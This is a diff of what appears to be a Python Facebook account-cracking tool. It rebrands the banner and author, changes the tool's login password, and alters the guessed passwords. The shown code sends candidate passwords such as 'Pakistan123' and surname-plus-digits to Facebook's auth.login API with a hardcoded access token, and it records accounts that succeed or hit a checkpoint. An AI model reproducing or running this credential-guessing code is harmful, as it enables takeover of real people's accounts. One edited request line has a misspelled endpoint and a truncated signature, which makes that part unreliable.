@@ -49,14 +49,14 @@ def jalan(z):
 ##### LOGO  #####
 logo = """ 
 
-\33[38;1mS̳H̳A̳B̳I̳R̳ ̳B̳A̳L̳O̳C̳H̳̳
-\33[38;1mP̳A̳K̳ ̳H̳A̳C̳K̳E̳R̳̳ 
-\33[38;1mW̳E̳ ̳A̳R̳E̳ ̳A̳N̳O̳N̳Y̳M̳O̳U̳S 
+\33[38;1mShadow hacker ̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳
+\33[38;1mCYBER KING ̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳ 
+\33[38;1mALONE CODER ̳̳̳̳̳̳̳̳ ̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳̳ 
 \33[38;1mW̳E̳ ̳A̳R̳E̳ ̳L̳E̳G̳I̳O̳N̳̳ 
-\33[38;1m0̳3̳2̳3̳2̳1̳3̳2̳3̳6̳2̳
+\33[38;1m03205105256
 \33[38;1mLoaded....100%
-\033[0;35m[\033[0;92m •• \033[0;35m] Author   : Shabir Baloch
-\033[1;34m\033[1;41;33mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹㅇ \033[0m"""
+\033[0;35m[\033[0;92m •• \033[0;35m] Author   : BlackHat
+\033[1;34m\033[1;41;33mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹ1 \033[0m"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -75,20 +75,20 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 
-\33[31;1m░S░H░A░B░I░R░ ░B░A░L░O░C░H░
-\33[31;1m░P░A░K░ ░H░A░C░K░E░R░
+\33[31;1m{S}{H}{A}{D}{O}{W} {H}{A}{C}{K}{E}{R}
+\33[31;1m🅲🆈🅱🅴🆁 🅺🅸🅽🅶
 \33[31;1m🅿🅰🅺🅸🆂🆃🅰🅽 🆉🅸🅽🅳🅰🅱🅰🅳
 \33[31;1m𝗩𝗜𝗦𝗜𝗧 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
-\33[31;1mC͎H͎A͎N͎N͎E͎L͎ ͎N͎A͎M͎E͎=͎ ͎B͎4͎ ͎B͎A͎L͎O͎C͎H͎ ͎M͎4͎ ͎M͎A͎S͎T͎E͎R͎
-\33[31;1mLOADING........
-\033[0;39m[\033[0;92m •• \033[0;39m] Author   : Shabir Baloch
+\33[31;1mC͎H͎A͎N͎N͎E͎L͎ ͎N͎A͎M͎E͎=͎ ͎͎͎͎ ͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎ ͎͎͎͎ ͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎A★L★O★N★E★ C★O★D★E★R★
+\33[31;1mLOADING.......
+\033[0;39m[\033[0;92m •• \033[0;39m] Author   : SHADOW HACKER
 \033[1;39m\033[1;41;39mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹ1 \033[0m
 \033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~"""
 print("\033[0;92mUsername/Password: 786786")
 print("\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~")
 
-CorrectUsername = "786786"
-CorrectPassword = "786786"
+CorrectUsername = "shadow"
+CorrectPassword = "hacker"
 
 
 loop = 'true'
@@ -358,7 +358,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = '786786'
+											pass5 = 'Pakistan123'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -400,7 +400,7 @@ def pilih_super():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																else:
-																	pass8 = b['last_name'] + '786'
+																	pass8 = b['last_name'] + '1122'
 																	data = urllib.urlopen("https://b-api.facebook.com/methode/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f522ef6")
 																	q = json.load(data)
 																	if 'access_token' in q:
